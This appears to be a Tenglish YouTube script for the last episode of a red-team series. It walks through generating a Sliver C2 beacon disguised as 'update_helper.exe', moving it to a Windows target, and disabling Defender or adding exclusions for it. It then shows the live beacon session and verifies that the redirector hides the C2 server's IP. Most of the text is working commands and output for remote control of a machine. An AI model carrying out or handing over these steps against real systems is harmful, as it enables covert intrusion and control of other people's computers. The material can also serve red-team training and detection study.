# Day 4: Payload Generation, Execution & Telemetry Verification (YouTube Script in Tenglish)

---

## 🎙️ Video Intro & Final Episode Recap

welcome back to the FINAL episode (Day 4) of our Red Team Infrastructure series!

booom! last 3 videos lo manam setup chesinavi quick ga recap cheddam:
* Day 1: C2 Architecture & OPSEC rules understand chesam.
* Day 2: Azure lo backend C2 server deploy chesi, NAT Gateway & Sliver C2 HTTPS listener setup chesam.
* Day 3: Hostinger domain DNS A record map chesi, Azure Redirector Nginx + Let's Encrypt SSL + scanner blocking + decoy page setup chesam.

so today final mission enti ante:
**Sliver lo Windows Payload generate chesi, Target machine lo execute chesi, live Beacon session obtain chesi, full network telemetry verify cheddam!**

ee video tarwatha mee complete 2-tier redirection infrastructure end-to-end working lo untadhi.

so let's dive into the final hands-on step!

---

## 🛠️ Step 1: Generate Stageless Windows Payload in Sliver

first C2 Server VM lo SSH login avvandi:

```bash
ssh c2admin@C2_SERVER_IP
```

launch Sliver console:

```bash
sudo sliver
```

Sliver prompt `sliver >` ragane, first HTTPS listener active ga undhi ledo verify cheddam:

```
sliver > jobs
```

if job #1 `:8443` running lo unte cool! 

now stageless Windows EXE beacon payload generate cheddam targeting our redirector domain & secret path:

```
sliver > generate beacon --http updates.ceruleanpay.online/updates/v2/sync --seconds 15 --jitter 5 --os windows --arch amd64 --save /tmp/update_helper.exe https
```

**command flags breakdown:**
* `--http updates.ceruleanpay.online/updates/v2/sync`: Mana Nginx redirector domain and secret URI path.
* `--seconds 15 --jitter 5`: Beacon check-in interval (every 10 to 20 seconds).
* `--os windows --arch amd64`: 64-bit Windows binary compile target.
* `--save /tmp/update_helper.exe`: Output path on C2 server.

compilation complete ayyaka `[*] Implant saved to /tmp/update_helper.exe` అని vastundi!

### ⚠️ Super Important Permission Fix!
Sliver `sudo` (root) tho run avthundhi kabatti, generated `/tmp/update_helper.exe` file root permissions (`-rw-------`) lo untadhi.

`c2admin` user e file ni SCP download cheyali ante permission read access ivvali:

```bash
# On C2 Server terminal:
sudo chmod 644 /tmp/update_helper.exe
```

*(why? so that c2admin can read & transfer the file without permission denied error!)*

---

## 📁 Step 2: Transfer Payload to Target Machine

now local workstation PowerShell terminal open chesi, C2 server nundi binary download cheddam:

```powershell
scp c2admin@C2_SERVER_IP:/tmp/update_helper.exe C:\Users\adversary\Desktop\update_helper.exe
```

`100% 34MB` download complete ayyaka, file Desktop lo untadhi!

---

## 🛡️ Step 3: Handle Windows Defender (Lab Testing)

**why handle Defender?**
real engagements lo manam code obfuscation, shellcode encryption, and AV evasion techniques vadtham. But ee series target purely C2 infrastructure verification kabatti, raw test binary ni Defender block cheyakunda exclusion add chestham.

### Option A: Add Folder Exclusion via PowerShell (Fastest)
Open **PowerShell as Administrator** on Target machine:

```powershell
Add-MpPreference -ExclusionPath "C:\Users\adversary\Desktop"
```

### Option B: Turn off Defender via Windows GUI
if Tamper Protection is enabled:
1. Open **Windows Security** -> **Virus & threat protection**.
2. Click **Manage settings** under *Virus & threat protection settings*.
3. Turn **OFF**: Tamper Protection, Real-time protection, Cloud-delivered protection.
4. Scroll down to **Exclusions** -> Add folder `C:\Users\adversary\Desktop`.

---

## 🚀 Step 4: Execute Payload & Catch Live Beacon Session

now Target machine Command Prompt lo binary run cheddam:

```cmd
C:\Users\adversary\Desktop> update_helper.exe
```

executable run ayyi prompt ki return avthundhi.

### Catching the Beacon in Sliver Console
now switch back to C2 Server terminal inside Sliver console:

**remember:** beacon 15-second sleep + 5-second jitter lo run avthundhi, so wait 15 to 20 seconds!

then run:

```
sliver > beacons
```

boooom! active beacon session kanipistundhi!

```
 ID         Name              Transport   Hostname      Username                Operating System
========== ================= =========== ============= ======================= ==================
 529c94b5   GRATEFUL_FORMER   http(s)     enterprises   ENTERPRISES\adversary   windows/amd64
```

### Interact with Beacon Session:
```
sliver > use 529c94b5
sliver (GRATEFUL_FORMER) > info
```

output lo target host details, OS build version, process ID (PID), and active user info kanipistundhi!

---

## 🔍 Step 5: Verify Network Telemetry (The Ultimate OPSEC Proof!)

now let's inspect all network layers to prove our C2 server is 100% hidden!

### 1. Target Windows VM Telemetry (`netstat`)
Target machine PowerShell lo active connections check cheddam:

```powershell
Get-NetTCPConnection -RemotePort 443 | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State
```

**Observation:**
Target machine is ONLY connected to `40.81.246.141:443` (Redirector Public IP).
Target machine has **ZERO connection or knowledge** of `98.70.44.111` (C2 Server IP)! Complete IP isolation!

### 2. Redirector Nginx Access Logs
SSH into Redirector VM and watch live logs:

```bash
sudo tail -f /var/log/nginx/access.log
```

**Expected Log Output:**
```
106.192.28.171 - - [04/Jul/2026:10:45:00 +0000] "POST /updates/v2/sync HTTP/1.1" 200 4096 "-" "Mozilla/5.0..."
```
*(Notice status code `200 OK` — request validated & proxied!).*

#### 💡 Nginx Status Code Troubleshooting:
* **`200 OK`**: Traffic successfully validated & proxied to Sliver C2!
* **`499 Client Closed Request` or `502 Bad Gateway`**: C2 Server UFW firewall port 8443 block chesthundhi! Fix: Run `sudo ufw allow 8443/tcp` on C2 Server.
* **`404 Not Found`**: Scanner User-Agent blocked OR URI path mismatch between Nginx & Sliver.

### 3. C2 Server Network Connection Verification
SSH into C2 Server VM and inspect port 8443:

```bash
sudo ss -tulpn | grep 8443
```

**Observation:**
Port 8443 receives incoming traffic strictly from `10.0.0.5` (Redirector private VNet IP). Zero direct public exposure!

---

## 🏆 Series Outro & Final Recap

CONGRATULATIONS GUYS! 🎉

Manam successful ga **2-Tier Red Team C2 Redirection Infrastructure** ni end-to-end build chesi verify chesam!

Let's recap the full journey across 4 videos:
* ✅ **Day 1**: Red Team C2 architecture, reverse connections, and OPSEC rules.
* ✅ **Day 2**: Provisioned `c2-server` VM on Azure, NAT Gateway, `fail2ban`, UFW firewall hardening & Sliver systemd service.
* ✅ **Day 3**: Mapped Hostinger DNS A record, deployed `redirector` VM, issued Let's Encrypt SSL via Certbot, deployed merchant decoy page & Nginx scanner blocking rules.
* ✅ **Day 4**: Generated Windows beacon payload, handled Defender exclusions, caught live beacon session in Sliver, and verified 100% target IP isolation.

If you enjoyed this complete hands-on Red Team Infrastructure series:
* Hit that **Like** button!
* **Subscribe** to the channel and turn on notification bell 🔔!
* Drop a comment below with your lab testing results or questions!

Thank you all for watching, see you in the next series! ✌️
